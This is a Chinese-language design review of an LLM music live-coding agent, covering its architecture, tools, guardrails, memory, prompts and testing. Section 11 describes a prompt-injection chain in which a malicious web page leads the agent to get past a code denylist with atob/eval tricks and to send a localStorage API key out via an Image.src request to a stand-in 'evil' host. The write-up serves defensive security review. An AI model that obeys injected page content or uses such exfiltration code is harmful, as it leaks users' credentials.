# Strudel Agent 设计问题清单

> 基于对项目代码的全面审查，结合 Anthropic《Building Effective Agents》、Vercel AI SDK v6、Mastra 等开源实践，从代码实现和架构设计两个维度整理的问题清单。

> **⚠️ 现状更新（2026-06）**：本清单部分问题已在后续重构中解决或缓解，阅读时请对照：
>
> **已解决**：
> - **第四节（4 个编辑工具语义重叠）**：`insert_code` / `replace_code` 已删除，编辑工具收敛为 `write_code` + `edit_lines` 两个，LLM 不再需要"我该用哪个"的决策负担。
> - **第六节（`preview_sound` 的 `savedCode` 闭包定时炸弹）**：`preview_sound` / `restore_code` 工具整体删除，闭包机制不复存在，问题根除。
>
> **本次新增缓解**：
> - **成本失控**：新增 `costBudgetExceeded` 护栏，单次 sendMessage 累计 token 触顶（默认 200k）即 abort（[Guardrail.mjs](../../website/src/repl/agent/Guardrail.mjs)）。
> - **工具循环**：新增 `detectRepeatedToolCall`，同工具同参数连续调用 >3 次即 abort。
> - **上下文预算一刀切**：按 provider 动态（Gemini 800k / Claude 160k / GPT-4o 100k），不再硬编码 30000。
> - **魔法数字散落**：集中到 [config.mjs](../../website/src/repl/agent/config.mjs)。
>
> **仍未解决**（下文仍适用）：
> - 第一节（Agent vs Workflow 骑墙）：`isGenerationRequest` 正则 + `CONTINUATION_NUDGE` 催办仍在，仍是硬编码 workflow 伪装成 agent。
> - 第二节（System Prompt 膨胀）：STATIC_PREFIX 仍 12 段常驻，未瘦身到 3 段。
> - 第十一节（安全：denylist + localStorage + web 注入）：API key 仍在 localStorage，`read_web` 仍直接灌入上下文，`Image` 仍不在黑名单。
> - ToolRegistry 半截子瘦身、analyze_audio 阻塞播放、无 human-in-the-loop 确认 —— 均未动。

---

## 一、架构层面：在 Agent 与 Workflow 之间骑墙

### 1.1 核心矛盾

按 Anthropic 定义：**Workflow 是 LLM 和工具通过预定义代码路径编排；Agent 是 LLM 动态指导自身流程和工具使用。** 当前设计的"任务完成护栏"——`isGenerationRequest` 正则判断意图 + `CONTINUATION_NUDGE` 催办注入 + while 循环——本质上是硬编码的 workflow 路径，却伪装成 agent。LLM 在这里没有自主权：代码用正则替它判断意图，用催办替它做决策，用步数预算替它踩刹车。

**这不是 agent 设计，是对 LLM 行为失控的恐慌性补丁。** 结果两头不讨好：比纯 workflow 复杂，比纯 agent 脆弱。

**建议**：二选一——
- 承认它是 workflow，把"查询音色 → 写代码 → 播放 → 验证"做成显式状态机；
- 或者真正放手让 LLM 自主决策，删掉护栏，用更好的工具设计让正确行为自然发生。

---

## 二、护栏是 Prompt 工程失败的症状

### 2.1 正则意图检测重新引入了已移除的复杂度

`useAgent.jsx` 的 `isGenerationRequest`（第 46-58 行）用中英文正则启发式判断意图——重构提案明确说"移除意图检测让 LLM 自己决定"，这里又用正则重新引入了意图检测，只是换了个位置。会有误判（如"给我看看有哪些鼓"会被判为生成请求）。

### 2.2 护栏只防"没写码"，不防"写了烂码"

`turnProducedPlayingCode`（第 69 行）用正则 `/playing|applied successfully|.../` 匹配工具返回字符串——这意味着如果模型写了一段能播放但完全不符合用户要求的垃圾代码，护栏会认为"任务完成"并停止。这是比"中途停下"更隐蔽的失败模式。

### 2.3 护栏正确性与工具返回措辞强耦合

`turnProducedPlayingCode` 把判定逻辑与 `tools.mjs` 各工具的返回字符串措辞耦合。改一句工具返回文案就可能导致护栏失效或误触发。

**建议**：
- 工具返回结构化结果（如 `{ ok: true, playing: true }`），护栏读字段而非匹配字符串。
- 让 `list_sounds` 的返回值本身强制链式触发，或在工具层面把"查询+写码"合并。
- 用 evaluator-optimizer 模式替代催办：写完代码后用轻量 LLM 评估"是否满足用户请求"。

---

## 三、14 个核心工具是认知过载

### 3.1 编辑工具语义重叠

4 个编辑工具语义重叠：`edit_lines`（按行号）、`replace_code`（按文本）、`insert_code`（按锚点）、`write_code`（全量）。LLM 要在每次编辑前做"我该用哪个？"的决策——这是无谓的推理负担。

### 3.2 编辑器实现细节泄漏到工具 API

行号、字符偏移、锚点类型（after_line/before_line/after_text/before_text）是编辑器的实现细节，不应暴露给 LLM。Cursor 的 agent 模式本质上只有 `read` / `edit` / `search` 三个原语。

**建议**：砍到 6 个：`read_code` / `edit_code`（智能选择全量替换还是局部编辑，内部实现）/ `play` / `stop` / `list_sounds` / `preview_sound`。把 `get_selection` / `get_errors` / `undo` 作为 `read_code` 的返回字段或独立能力，而非并列工具。

---

## 四、`maxSteps: 100` + 3 轮催办 = 潜在烧钱机器

### 4.1 步数与成本无上限

`maxSteps: 100`，`STEP_BUDGET=30` 跨催办轮次累计。但没有**成本上限**——30 步 GPT-4o 和 30 步 Claude Sonnet 的成本差 3 倍。一个病态会话可能在用户没注意时烧掉几美元。

### 4.2 无重复检测

如果同一个工具用相同参数调用了 3 次，这是死循环的信号，但当前没有检测。

**建议**：
- `maxSteps` 降到 15-20，催办最多 1 轮（不是 3 轮）。
- 加成本护栏：累计 token 超过阈值（如 $0.50）时停止并提示用户。
- 加重复检测：同一工具同一参数调用 3 次即停止报错。

---

## 五、记忆系统缺失

### 5.1 音乐创作是累积式的，但没有记忆

- "加点 hi-hat" → 需要记住"加到什么上面"
- "再来一段类似的" → 需要记住"类似什么"
- "把速度调快" → 需要记住"当前速度是多少"

这些信息散落在消息历史里，靠 LLM 从 30 步的历史里捞。一旦压缩，就丢了。

### 5.2 对比 Mastra 的三层记忆模型

1. **Working memory**（持久用户画像）："用户喜欢 dark phonk，140 BPM，常用 RolandTR909"——跨会话保留
2. **Conversation history**（近期消息）：当前这轮对话
3. **Semantic recall**（语义召回）："上次用户让我做的那个 amen break 风格的鼓组"——向量检索

当前实现只有第 2 层，而且是滑动窗口版。

**建议**：最小实现——在 IndexedDB 里存一个 `workingMemory` markdown 块，每轮结束后让 LLM 用一个轻量调用更新它（"用户这轮表达了什么偏好？"），下轮注入 system prompt。

---

## 六、`preview_sound` 的 `savedCode` 闭包是定时炸弹

### 6.1 隐式状态机

`savedCode` 是 `createTools` 闭包里的一个 `let`。状态转换是隐式的：

```
preview_sound → savedCode = currentCode
preview_sound again → savedCode 不变（保留第一次的，因为 if (savedCode === null) 守卫）
write_code → clearPreviewIfActive → 恢复 savedCode → 再写入
restore_code → 恢复 savedCode
```

如果 LLM 的工具调用序列是 `preview_sound(A) → preview_sound(B) → list_sounds → edit_lines`，`savedCode` 在第二次 preview 时不会更新，`edit_lines` 会恢复到 A 之前的代码——用户在 B 预览期间手动改的代码被静默丢弃。

### 6.2 阻碍并行工具调用

`savedCode` 是跨工具调用的可变共享状态，`parallelToolCalls` 默认 `false` 正是因为这个。开并行立刻炸。

**建议**：preview 返回一个 `previewHandle`，commit/rollback 显式操作，不靠隐式闭包。

---

## 七、没有 human-in-the-loop

### 7.1 `write_code` 全量替换无确认

用户花了 30 分钟调的一段复杂 pattern，对 agent 说"加个 reverb"，agent 可能调 `write_code` 全量重写——如果模型理解偏差，整段代码没了。undo 能救一次，但如果用户没立刻发现呢？

### 7.2 无 diff 预览

Vercel AI SDK v6 新增了 `needsApproval` 用于 human-in-the-loop。当前没有任何确认机制。

**建议**：
- `write_code`（全量替换）必须有 diff 预览 + 用户确认。
- `edit_lines` / `replace_code`（局部修改）可以自动应用，但要在 UI 上显示 diff。
- 引入"检查点"概念：每次 agent 修改代码前自动存快照，用户能一键回滚到任意检查点。

---

## 八、Agent 对音频运行时状态是盲的

### 8.1 缺少运行时上下文注入

System prompt 注入了 `currentCode`，但没有注入运行时状态：当前是否在播放？播放了多久？当前 cpm/cps 是多少？调度器状态？用户听到的是第几小节？

Agent 无法理解：
- "让它再播 4 小节然后加个 fill" → agent 不知道现在播到哪
- "太快了" → agent 不知道当前速度
- "停一下" → agent 不知道是不是已经在播

### 8.2 "改完才播" vs "边播边改"

音乐 live-coding 的核心交互是时间敏感的。TidalCycles/Strudel 的哲学是"边播边改"。但 agent 是"改完才播"——它写完代码 → evaluate → 播放 → 结束。它不能在播放过程中做决策。

**建议**：把 transport 状态（播放位置、cps、当前 cycle）注入每轮上下文。如果要做真正的 live-coding agent，需要支持在播放过程中做决策。

---

## 九、插件系统是 YAGNI 的教科书案例

### 9.1 过度设计

ToolRegistry + ToolContext 实现了：manifest 校验、capability 声明、权限原因、工具名冲突检测、最小权限 ctx 构建、域名白名单 fetch……但实际只有 2 个内置插件，都自动启用，无用户授权 UI。

### 9.2 能力声明与实际行为不一致

web-research 插件声明了 `net:fetch` 权限，但工具 `requires: []`（空），且直接调用 `fetch()` 而非 `ctx.net.fetch`。ToolContext 的域名白名单安全机制被绕过。

### 9.3 不兼容 MCP

ToolRegistry 既不兼容 MCP 协议，也没有真实第三方用户。Mastra 直接复用 MCP 协议生态接入第三方工具。

**建议**：删掉 ToolRegistry / ToolContext / capability 系统，把 2 个插件直接写成核心工具。等真正需要第三方插件时，直接接入 MCP（Vercel AI SDK v6 原生支持 `@ai-sdk/mcp`）。

---

## 十、System Prompt 问题

### 10.1 常驻 3000+ tokens，"动态注入"名不副实

`CORE_PROMPT` + `COMPLETION_CONTRACT` + `INVALID_METHODS_SECTION` + `PATTERN_FUNCTIONS` + `EFFECTS_REFERENCE` + `MUSICALITY_SECTION` + `ARRANGEMENT_TOOLKIT` + `WORKFLOW_SECTION` 全部常驻注入。重构提案"简单问题 ~500 tokens、节省 50%"的目标基本未达成。`KEYWORD_PATTERNS` 只对 `SOUND_REFERENCE` / `GENRE_COOKBOOK` / `SAMPLE_BANKS` 三个片段生效。

### 10.2 用全大写和"FORBIDDEN"对 LLM 喊话是反模式

`COMPLETION_CONTRACT` 里满是 "NEVER STOP MID-TASK"、"HIGHEST PRIORITY"、"FORBIDDEN"、"BAD (stops after discovery — FORBIDDEN)"。这说明工具/prompt 没有让正确行为成为阻力最小的路径，只能靠恐吓。Anthropic 的 prompt 风格是冷静、示例驱动、正向引导。

### 10.3 负面约束和静态知识应该用 few-shot examples 替代

`INVALID_METHODS_SECTION`（"这些方法不存在"）+ `MUSICALITY_SECTION`（"编排质量标准"）+ `ARRANGEMENT_TOOLKIT`（"编排工具箱"）大量是负面约束和静态知识。给 3 个"好"的完整 pattern 示例，比 1500 tokens 的规则描述有效得多，且更省 token。

**建议**：
- 重新评估哪些片段必须常驻，哪些可以按需注入。
- 用 few-shot examples 替代大段规则描述。
- 停止对 LLM 喊话，用工具设计让正确行为自然发生。

---

## 十一、安全模型是自欺欺人

### 11.1 Denylist 永远滞后于攻击

codeGuard.mjs 是 denylist。注释自己写了："denylist 不是完美沙箱，是显著抬高门槛。" API key 在 localStorage，agent 写的代码在页面 origin 内执行，`read_web` 把任意网页内容灌进上下文。

### 11.2 攻击链

用户让 agent "读这个链接" → 链接指向恶意页面 → 页面内容是 prompt injection → agent 生成代码绕过 denylist（比如用 `atob` + 字符串拼接构造 `eval`，或用 `Image.src = 'https://evil/?key=' + ...` 外泄——`Image` 不在黑名单里）→ 代码执行 → 读取 localStorage 的 API key → 外泄。

### 11.3 Denylist 测试覆盖的是已知攻击，不是未知攻击

`_test_tmp/test_code_guard.mjs` 覆盖了各种已知绕过手法，但攻击者不是在测试时绕过，是在运行时用没想到的手法绕过。

**建议**：
- 把 API key 移出 localStorage（用 OAuth + httpOnly cookie + 后端代理）。
- 把 agent 生成的代码放进 sandboxed iframe 或 Web Worker（不同 origin）执行。
- Denylist 作为辅助手段保留，但不作为主要安全防线。

---

## 十二、useAgent.jsx 仍是"上帝 Hook"

### 12.1 提案描述的 AgentEngine 和 Memory 未真正实现

状态机逻辑、护栏判定、催办注入、压缩、项目隔离、token 统计全部塞在 useAgent.jsx 一个文件里（653 行）。`runOneTurn` + while 循环就是事实上的 AgentEngine，但没有抽象出来，难以单测和复用。

### 12.2 纯函数未抽离

`isGenerationRequest`、`turnProducedPlayingCode`、`buildTranscript`、`CONTINUATION_NUDGE` 这些纯函数/常量可以独立测试，但埋在 useAgent.jsx 里。

**建议**：至少把护栏逻辑抽成独立的 `Guardrail.mjs`，纯函数抽到独立模块。

---

## 十三、上下文压缩仍是滑动窗口

### 13.1 智能压缩未实现

重构提案描述的 Memory 系统（重要性评分、自动摘要、30 分钟时间衰减）未实现。`ContextManager.compressMessages` 只是从后往前保留 + 保护工具调用对，是最朴素的滑动窗口。

### 13.2 LLM 摘要压缩是手动触发

`compressHistory` 是用户手动点击触发的，不是自动的。

### 13.3 Token 估算过于粗糙

`4 字符 ≈ 1 token` 对中文严重失准（1 个中文字符 ≈ 1-2 tokens，而非 0.25）。`DEFAULT_CONTEXT_BUDGET = 30000` 硬编码，不随模型上下文窗口调整。

**建议**：
- 实现基于重要性的动态压缩（错误 > 工具失败 > 代码修改 > 闲聊）。
- 自动触发摘要（当上下文超过预算 80% 时）。
- Token 估算按模型区分，或使用 tiktoken 等精确计数器。

---

## 十四、缺少可观测性

### 14.1 无指标收集

重构提案描述的 MetricsCollector（工具成功率、p95 响应时间、失败原因统计、成本估算）未实现。当前只有 `tokenUsage`（累计 prompt/completion/total）和 `stepCount`。

### 14.2 无延迟感知

没有追踪时间花在哪：LLM 推理？工具执行？引擎 evaluate？网络？对于 live-coding 工具，延迟就是 UX。

**建议**：实现最小 MetricsCollector：工具调用次数/成功率/耗时、LLM 调用耗时、总请求耗时。

---

## 十五、测试覆盖不足

除 `_test_tmp/test_code_guard.mjs` 外，agent 模块没有任何单元测试。`isGenerationRequest`、`turnProducedPlayingCode`、`compressMessages`、`toCoreMessages`、`buildSystemPrompt` 这些纯函数都没有测试。重构提案"测试覆盖率 0% → >70%"的目标未达成。

**建议**：优先为纯函数（`isGenerationRequest`、`turnProducedPlayingCode`、`compressMessages`、`toCoreMessages`、`validateCode`）补测试。

---

## 十六、魔法数字散落

`MAX_CONTINUATIONS=3`、`STEP_BUDGET=30`、`KEEP=4`、`MAX_CHARS=24000`、`MAX_ATTACHMENT_BYTES=50MB`、`updateInterval=5000`、防抖 `2000ms`、流式刷新 `50ms`——都硬编码在各自模块里，没有集中配置。

**建议**：集中到 `agent/config.mjs`，按模型/场景可调。

---

## 十七、没有模型路由

GPT-4o / Claude / Gemini 能力差异巨大，但用同一份 prompt、同一套工具、同一个 maxSteps 对待它们。Claude 长上下文好（可以塞更多音色库），Gemini 上下文巨大（可以塞完整 soundMap），GPT-4o 结构化输出好。没有按模型调整策略。

**建议**：根据 `config.provider` 动态调整 system prompt 大小、maxSteps、工具集。

---

## 十八、没有 evaluator-optimizer 循环

写完代码 → 引擎不报错 → 完成。但"不报错"≠"好听"。`MUSICALITY_SECTION` 是静态检查清单，没有实际评估。一个真正的音乐 agent 应该有评估步骤：写完 → 播放 → 评估（在不在调上？节奏对不对？层次够不够？）→ 不够就改。这才是 Anthropic 说的 evaluator-optimizer 模式在音乐场景的正确应用。

**建议**：在护栏判定"代码已播放"后，加一个轻量评估步骤（可以是规则检查，也可以是 LLM 评估），不满足质量标准则继续修改。

---

## 十九、没有多模态输出

Agent 只能回文字 + 工具调用。不能画 piano roll、不能显示频谱、不能可视化 pattern 结构。mp3-analyzer 有 AnalysisPanel 做输入可视化，但输出侧什么都没有。音乐工具的反馈应该是视听的，不是纯文本的。

**建议**：为 `write_code` / `edit_lines` 的结果增加 piano roll / 波形可视化渲染器。

---

## 二十、没有 agent 级别的版本/检查点

`undo` 只撤销一次编辑器操作。如果 agent 做了 5 次修改跨 3 轮对话，用户想"回到 agent 接手之前的状态"——做不到。创作工具需要版本树，不是线性 undo。

**建议**：引入检查点系统——agent 修改前自动存快照，用户能浏览和回滚到任意检查点。

---

## 优先级排序

| 优先级 | 问题 | 理由 |
|--------|------|------|
| P0 | 护栏重构（结构化工具结果 + evaluator-optimizer） | 当前护栏脆弱且只防"没写码"不防"写了烂码" |
| P0 | 砍工具到 6 个 | 14 个工具的认知过载直接影响 LLM 决策质量 |
| P0 | 加 diff 预览 + 检查点 | `write_code` 全量替换无确认是产品事故等发生 |
| P1 | 加 working memory | 音乐创作的累积性没有记忆支撑是致命的 |
| P1 | 删掉 ToolRegistry/ToolContext | YAGNI，等需要时接 MCP |
| P1 | 安全做对（API key 移出 localStorage 或代码沙箱化） | denylist 是安全剧场 |
| P1 | 加成本护栏和重复检测 | 无成本上限 = 烧钱 |
| P2 | System Prompt 重构（few-shot 替代规则独白） | 省 token + 提升效果 |
| P2 | 抽离护栏逻辑到独立模块 | 可测试性 |
| P2 | 补纯函数测试 | 可维护性 |
| P2 | 注入运行时状态 | live-coding 的核心交互需求 |
| P3 | 智能上下文压缩 | 当前滑动窗口能用但不优 |
| P3 | 可观测性（MetricsCollector） | 调优需要数据 |
| P3 | 模型路由 | 不同模型能力差异大 |
| P3 | 多模态输出 | 体验提升 |
| P3 | evaluator-optimizer 循环 | 质量保障 |
